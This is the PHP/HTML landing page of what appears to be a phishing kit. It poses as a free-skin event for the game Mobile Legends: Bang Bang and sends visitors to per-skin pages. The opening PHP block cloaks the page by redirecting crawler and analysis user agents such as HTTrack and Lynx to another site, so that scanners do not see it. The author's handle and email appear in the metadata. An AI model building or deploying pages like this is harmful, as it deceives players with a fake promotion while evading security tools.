<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: http://www.anampedia.net');
die();
}
?>

<!DOCTYPE html>
<html>
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta property="og:title" content="Mobile Legend : Bang Bang">
    <meta name="description" content="Event Free Skin From Moontoon">
    <meta property="og:description" content="Event Free Skin From Moontoon">
    <meta property="og:url" content="./">
    <meta property="og:site_name" content="MLBB">
    <meta property="og:image" content="./assets/images/7.jpg">
    <meta property="og:type" content="website">
    <meta name="author" content="Idhaam69, rajaarn0@gmail.com">
    <meta name="copyright"content="Mobile Legend : Bang Bang">
    <title>Mobile Legend - Evolution | Events</title>
    <link rel="stylesheet" type="text/css" media="screen" href="./assets/css/style.css" />
    <link rel="shorcut icon" href="./assets/images/favicon.jpg">
</head>
<body>
    <div id="landingpage">
        <img class="img-landingpage" src="./assets/images/logo.png" alt="idhaam69"/>
        <p class="txt-landingpage">Mobile Legend Event's</p>
        <hr class="garis-landingpage">
        <p class="txt-landingpage">GET FREE SKIN ONLY HERE</p>
        <button class="btn-landingpage" onclick="location.href='./legend.php';">SKIN LEGEND - [ FREE ]</button><p>
        <button class="btn-landingpage" onclick="location.href='./lightborn.php';">SKIN LIGHTBORN - [ FREE ]</button><p>
        <button class="btn-landingpage" onclick="location.href='./zodiak.php';">SKIN ZODIAK - [ FREE ]</button><p>
        <button class="btn-landingpage" onclick="location.href='./venom.php';">SKIN VENOM - [ FREE ]</button><p>
             <button class="btn-landingpage" onclick="location.href='./epic.php';">MORE SKIN EPIC - [ FREE ]</button><p>
    </div>
</body>
<script src="./assets/js/idhaam69.js"></script>
</html>